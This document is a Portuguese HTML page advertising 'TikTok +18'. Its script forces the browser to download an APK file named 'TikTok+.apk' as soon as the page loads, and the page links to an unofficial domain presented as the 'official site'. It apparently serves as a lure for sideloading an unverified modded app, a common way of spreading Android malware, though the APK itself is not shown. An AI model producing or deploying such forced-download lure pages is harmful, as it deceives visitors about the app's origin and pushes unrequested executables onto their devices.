<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Download TikTok +18</title>
    <script>
        function iniciarDownload() {
            var link = document.createElement('a');
            link.href = 'TikTok+.apk'; // URL do arquivo
            link.download = 'TikTok+.apk'; // Nome do arquivo a ser salvo
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
        }

        window.onload = iniciarDownload; // Iniciar o download quando a página for carregada
    </script>
</head>
<body>
    <!-- O conteúdo da página -->
    <p>O download do arquivo começará automaticamente.</p>
    <a href="https://gruposegrupos.com.br/tiktok" class=btn>Voltar ao Site Oficial</a>
</body>
</html>
